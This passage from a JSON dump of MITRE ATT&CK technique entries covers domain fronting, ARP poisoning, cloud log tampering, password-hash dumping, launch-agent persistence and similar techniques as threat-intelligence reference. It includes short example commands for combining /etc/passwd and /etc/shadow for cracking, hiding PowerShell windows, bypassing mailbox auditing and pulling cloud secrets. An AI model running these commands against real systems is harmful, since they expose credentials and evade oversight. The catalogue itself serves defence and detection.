unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["APT29"]},"T1557.002":{"id":"T1557.002","name":"ARP Cache Poisoning","description":"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.^[[1]](https://tools.ietf.org/html/rfc826)^ Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.^[[2]](https://pen-testing.sans.org/resources/papers/gcih/real-world-arp-spoofing-105411)^^[[3]](https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf)^\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.^[[2]](https://pen-testing.sans.org/resources/papers/gcih/real-world-arp-spoofing-105411)^\n","platforms":["Linux","Windows","macOS"],"tactics":["Credential Access","Collection"],"campaigns":[],"groups":["Cleaver","LuminousMoth"]},"T1562.008":{"id":"T1562.008","name":"Disable or Modify Cloud Logs","description":"An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.^[[1]](https://expel.io/blog/following-cloudtrail-generating-aws-security-signals-sumo-logic/)^ They may alternatively tamper with logging functionality – for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.^[[2]](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudtrail/update-trail.html)^^[[3]](https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/detection__disruption/main.py)^ In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user’s license from an Enterprise E5 to an Enterprise E3 license.^[[4]](https://www.darkreading.com/threat-intelligence/incident-responders-explore-microsoft-365-attacks-in-the-wild/d/d-id/1341591)^","platforms":["IaaS","SaaS","Google Workspace","Azure AD","Office 365"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1518.001":{"id":"T1518.001","name":"Security Software Discovery","description":"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), `reg query` with [Reg](https://attack.mitre.org/software/S0075), `dir` with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.^[[1]](https://expel.io/blog/finding-evil-in-aws/)^ For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the `DescribeSecurityGroups` action with various request parameters. ^[[2]](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeSecurityGroups.html)^","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace"],"tactics":["Discovery"],"campaigns":["Operation Wocao","Frankenstein"],"groups":["Darkhotel","Sidewinder","SideCopy","Windshift","APT38","FIN8","TA2541","The White Company","Naikon","Cobalt Group","Wizard Spider","Patchwork","MuddyWater","Aquatic Panda","Kimsuky","TeamTNT","Turla","Tropic Trooper","Rocke","Operation Wocao","Frankenstein"]},"T1564.003":{"id":"T1564.003","name":"Hidden Window","description":"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is `powershell.exe -WindowStyle Hidden`. ^[[1]](https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1)^\n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be `apple.awt.UIElement`, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.^[[2]](https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/)^","platforms":["macOS","Windows","Linux"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["APT3","APT28","APT19","Deep Panda","Gorgon Group","CopyKittens","Higaisa","Gamaredon Group","DarkHydrus","Nomadic Octopus","Kimsuky","APT32","Magic Hound"]},"T1059.006":{"id":"T1059.006","name":"Python","description":"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the `python.exe` interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.","platforms":["Linux","Windows","macOS"],"tactics":["Execution"],"campaigns":["Operation Wocao"],"groups":["APT37","BRONZE BUTLER","Tonto Team","ZIRCONIUM","Rocke","Machete","Earth Lusca","MuddyWater","Turla","APT29","APT39","Dragonfly","Kimsuky","Operation Wocao","Dragonfly 2.0"]},"T1591.004":{"id":"T1591.004","name":"Identify Roles","description":"Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).^[[1]](https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":["Operation Dream Job"],"groups":["LAPSUS$","HEXANE","Lazarus Group"]},"T1132":{"id":"T1132","name":"Data Encoding","description":"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.^[[1]](https://en.wikipedia.org/wiki/Binary-to-text_encoding)^ ^[[2]](https://en.wikipedia.org/wiki/Character_encoding)^ Some data encoding systems may also result in data compression, such as gzip.","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":[]},"T1546.010":{"id":"T1546.010","name":"AppInit DLLs","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the `AppInit_DLLs` value in the Registry keys `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows` or `HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows` are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. ^[[1]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. ^[[2]](https://support.microsoft.com/en-us/kb/197571)^ Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. ^[[3]](https://msdn.microsoft.com/en-us/library/dn280412)^","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":["APT39"]},"T1598":{"id":"T1598","name":"Phishing for Information","description":"Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.^[[1]](https://threatpost.com/facebook-launching-pad-phishing-attacks/160351/)^^[[2]](https://www.trendmicro.com/en_us/research/20/i/tricky-forms-of-phishing.html)^^[[3]](https://www.pcmag.com/news/hackers-try-to-phish-united-nations-staffers-with-fake-login-pages)^^[[4]](https://nakedsecurity.sophos.com/2020/10/02/serious-security-phishing-without-links-when-phishers-bring-along-their-own-web-pages/)^^[[5]](https://github.com/ryhanson/phishery)^ Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.^[[6]](https://www.avertium.com/resources/threat-reports/everything-you-need-to-know-about-callback-phishing)^\n\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing^[[7]](https://www.proofpoint.com/us/threat-reference/email-spoofing)^ the identity of the sender which can be used to fool both the human recipient as well as automated security tools.^[[8]](https://blog.cyberproof.com/blog/double-bounced-attacks-with-email-spoofing-2022-trends)^ \n\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).^[[9]](https://www.microsoft.com/en-us/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/)^^[[10]](https://unit42.paloaltonetworks.com/examining-vba-initiated-infostealer-campaign/)^","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Scattered Spider","ZIRCONIUM","APT28"]},"T1496":{"id":"T1496","name":"Resource Hijacking","description":"Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.^[[1]](https://securelist.com/lazarus-under-the-hood/77908/)^ Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.^[[2]](https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc)^ Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.^[[3]](https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/)^^[[4]](https://www.trendmicro.com/en_us/research/19/e/infected-cryptocurrency-mining-containers-target-docker-hosts-with-exposed-apis-use-shodan-to-find-additional-victims.html)^\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.^[[5]](https://www.trendmicro.com/en_us/research/20/i/war-of-linux-cryptocurrency-miners-a-battle-for-resources.html)^\n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.^[[6]](https://www.welivesecurity.com/2019/07/08/south-korean-users-backdoor-torrents/)^ Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.^[[7]](https://sysdig.com/blog/proxyjacking-attackers-log4j-exploited/)^","platforms":["Windows","IaaS","Linux","macOS","Containers"],"tactics":["Impact"],"campaigns":[],"groups":["Rocke","Blue Mockingbird","TeamTNT","APT41","Lazarus Group"]},"T1585":{"id":"T1585","name":"Establish Accounts","description":"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.^[[1]](https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation)^^[[2]](http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf)^\n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.^[[1]](https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation)^^[[2]](http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf)^\n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).^[[3]](https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["Fox Kitten","APT17"]},"T1588":{"id":"T1588","name":"Obtain Capabilities","description":"Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\n\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.^[[1]](https://www.nytimes.com/2013/07/14/world/europe/nations-buying-as-hackers-sell-computer-flaws.html)^^[[2]](https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/)^\n\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.^[[3]](https://threatpost.com/final-report-diginotar-hack-shows-total-compromise-ca-servers-103112/77170/)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1546.002":{"id":"T1546.002","name":"Screensaver","description":"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.^[[1]](https://en.wikipedia.org/wiki/Screensaver)^ The Windows screensaver application scrnsave.scr is located in `C:\\Windows\\System32\\`, and `C:\\Windows\\sysWOW64\\`  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (`HKCU\\Control Panel\\Desktop\\`) and could be manipulated to achieve persistence:\n\n* `SCRNSAVE.exe` - set to malicious PE path\n* `ScreenSaveActive` - set to '1' to enable the screensaver\n* `ScreenSaverIsSecure` - set to '0' to not require a password to unlock\n* `ScreenSaveTimeout` - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.^[[2]](https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf)^","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":[]},"T1578.002":{"id":"T1578.002","name":"Create Cloud Instance","description":"An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may [Create Snapshot](https://attack.mitre.org/techniques/T1578/001) of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect [Data from Local System](https://attack.mitre.org/techniques/T1005) or for [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002).^[[1]](https://content.fireeye.com/m-trends/rpt-m-trends-2020)^\n\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.","platforms":["IaaS"],"tactics":["Defense Evasion"],"campaigns":["C0027"],"groups":["LAPSUS$"]},"T1555.006":{"id":"T1555.006","name":"Cloud Secrets Management Stores","description":"Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  \n\nSecrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  \n\nIf an adversary is able to gain sufficient privileges in a cloud environment – for example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets – they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.^[[1]](https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud)^^[[2]](https://sysdig.com/blog/scarleteel-2-0/)^^[[3]](https://docs.aws.amazon.com/secretsmanager/latest/userguide/retrieving-secrets.html)^^[[4]](https://cloud.google.com/secret-manager/docs/view-secret-details)^^[[5]](https://learn.microsoft.com/en-us/azure/key-vault/secrets/quick-create-cli)^\n\n**Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.","platforms":["IaaS"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1213.003":{"id":"T1213.003","name":"Code Repositories","description":"Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).^[[1]](https://www.wired.com/story/uber-paid-off-hackers-to-hide-a-57-million-user-data-breach/)^^[[2]](https://krebsonsecurity.com/2013/10/adobe-to-announce-source-code-customer-data-breach/)^\n\n**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.","platforms":["SaaS"],"tactics":["Collection"],"campaigns":["SolarWinds Compromise"],"groups":["LAPSUS$","APT29"]},"T1565.002":{"id":"T1565.002","name":"Transmitted Data Manipulation","description":"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.^[[1]](https://content.fireeye.com/apt/rpt-apt38)^^[[2]](https://www.justice.gov/opa/press-release/file/1092091/download)^ By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","platforms":["Linux","macOS","Windows"],"tactics":["Impact"],"campaigns":[],"groups":["APT38"]},"T1003.008":{"id":"T1003.008","name":"/etc/passwd and /etc/shadow","description":"Adversaries may attempt to dump the contents of `/etc/passwd` and `/etc/shadow` to enable offline password cracking. Most modern Linux operating systems use a combination of `/etc/passwd` and `/etc/shadow` to store user account information including password hashes in `/etc/shadow`. By default, `/etc/shadow` is only readable by the root user.^[[1]](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)^\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:^[[2]](https://www.cyberciti.biz/faq/unix-linux-password-cracking-john-the-ripper/)^ `# /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db`\n","platforms":["Linux"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1543.001":{"id":"T1543.001","name":"Launch Agent","description":"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in `/System/Library/LaunchAgents`, `/Library/LaunchAgents`, and `~/Library/LaunchAgents`.^[[1]](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)^^[[2]](https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/)^ ^[[3]](https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/)^ Property list files use the `Label`, `ProgramArguments `, and `RunAtLoad` keys to identify the Launch Agent's name, executable location, and execution time.^[[4]](https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/)^ Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the `RunAtLoad` or `KeepAlive` keys set to `true`.^[[5]](https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/)^^[[6]](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf)^ The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.^[[7]](https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf)^^[[8]](https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update)^ ","platforms":["macOS"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1569":{"id":"T1569","name":"System Services","description":"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.","platforms":["Windows","macOS","Linux"],"tactics":["Execution"],"campaigns":[],"groups":["TeamTNT"]},"T1059.003":{"id":"T1059.003","name":"Windows Command Shell","description":"Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).^[[1]](https://docs.microsoft.com/en-us/windows/terminal/tutorials/ssh)^\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.","platforms":["Windows"],"tactics":["Execution"],"campaigns":["Operation Wocao","Night Dragon","2016 Ukraine Electric Power Attack","Operation Honeybee","FunnyDream","Frankenstein","SolarWinds Compromise","C0017","Operation CuckooBees","C0015","Operation Dream Job"],"groups":["Lazarus Group","Suckfly","GALLIUM","Magic Hound","ZIRCONIUM","Dark Caracal","Wizard Spider","Volt Typhoon","OilRig","Threat Group-3390","Threat Group-1314","Nomadic Octopus","TeamTNT","Machete","APT38","MuddyWater","HAFNIUM","APT3","APT32","FIN10","Gorgon Group","FIN6","Fox Kitten","Blue Mockingbird","APT28","Kimsuky","Metador","Mustang Panda","Tropic Trooper","APT41","Indrik Spider","Aquatic Panda","FIN13","Turla","Chimera","Sowbug","Cobalt Group","Dragonfly","LazyScripter","Darkhotel","Patchwork","APT37","FIN7","Ke3chang","BRONZE BUTLER","Ember Bear","Higaisa","menuPass","FIN8","APT18","TA551","Rancor","APT1","Silence","Gamaredon Group","admin@338","TA505","APT29","Sandworm Team","UNC2452","Honeybee","Frankenstein","Operation Wocao","Dragonfly 2.0","Leviathan"]},"T1055.009":{"id":"T1055.009","name":"Proc Memory","description":"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (`/proc/[pid]`) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within `/proc/[pid]/maps` can be overwritten using dd.^[[1]](http://hick.org/code/skape/papers/needle.txt)^^[[2]](https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html)^^[[3]](http://man7.org/linux/man-pages/man1/dd.1.html)^ \n\nOther techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).^[[2]](https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html)^ \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. ","platforms":["Linux"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":[]},"T1650":{"id":"T1650","name":"Acquire Access","description":"Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.^[[1]](https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/)^^[[2]](https://www.crowdstrike.com/blog/access-brokers-targets-and-worth/)^^[[3]](https://krebsonsecurity.com/2012/10/service-sells-access-to-fortune-500-firms/)^ In some cases, adversary groups may form partnerships to share compromised systems with each other.^[[4]](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-152a)^\n\nFootholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003)) or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133). In some cases, access brokers will implant compromised systems with a “load” that can be used to install additional malware for paying customers.^[[1]](https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/)^\n\nBy leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.^[[1]](https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/)^^[[2]](https://www.crowdstrike.com/blog/access-brokers-targets-and-worth/)^\n\nIn some cases, purchasing access to an organization in sectors such as IT 